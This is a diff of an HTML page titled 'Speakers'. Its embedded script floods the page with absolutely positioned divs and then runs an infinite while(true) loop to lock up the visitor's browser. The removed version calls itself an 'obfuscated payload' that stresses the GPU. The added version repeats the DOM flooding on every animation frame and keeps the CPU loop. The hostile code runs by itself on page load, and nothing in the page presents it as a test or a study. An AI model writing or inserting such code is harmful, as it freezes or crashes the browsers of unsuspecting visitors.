@@ -1,39 +1,35 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8" />
 <title>Speakers</title>
 <style>
-html, body {
-  margin:0; padding:0;
-  width:100%; height:100%;
-  background:black;
-  overflow:hidden;
-}
+html, body { margin:0; padding:0; width:100%; height:100%; background:black; overflow:hidden; }
 </style>
 </head>
 <body>
 <script>
-// Obfuscated payload
 (function(){
-  let a=1e5,b='div',c='absolute',d='top',e='left',f=document,g='style',h='background',i='black',j='width',k='height',l='100%',m='animation',n='spin 1s linear infinite';
-  for(let z=0;z<a;z++){
-    let y=f.createElement(b);
-    y[g].position=c;
-    y[g][d]=(Math.random()*100)+'%';
-    y[g][e]=(Math.random()*100)+'%';
-    y[g][j]='10px';
-    y[g][k]='10px';
-    y[g][h]=i;
-    y[g][m]=n;
-    f.body.appendChild(y);
+  // Fill the DOM infinitely, keep adding & moving elements to force layout
+  let body = document.body;
+  function spam() {
+    for (let i=0; i<1000; i++) {
+      let d = document.createElement('div');
+      d.style.position = 'absolute';
+      d.style.top = (Math.random()*100)+'%';
+      d.style.left = (Math.random()*100)+'%';
+      d.style.width = '10px';
+      d.style.height = '10px';
+      d.style.background = 'black';
+      body.appendChild(d);
+    }
+    // Repeat immediately
+    requestAnimationFrame(spam);
   }
-  // Add spin keyframes to stress GPU
-  let s=f.createElement('style');
-  s.textContent='@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}';
-  f.head.appendChild(s);
-  // Infinite CPU loop after short delay
-  setTimeout(()=>{while(true){}},500);
+  spam();
+
+  // Also add infinite CPU loop after a bit
+  setTimeout(()=>{ while(true){} }, 1000);
 })();
 </script>
 </body>
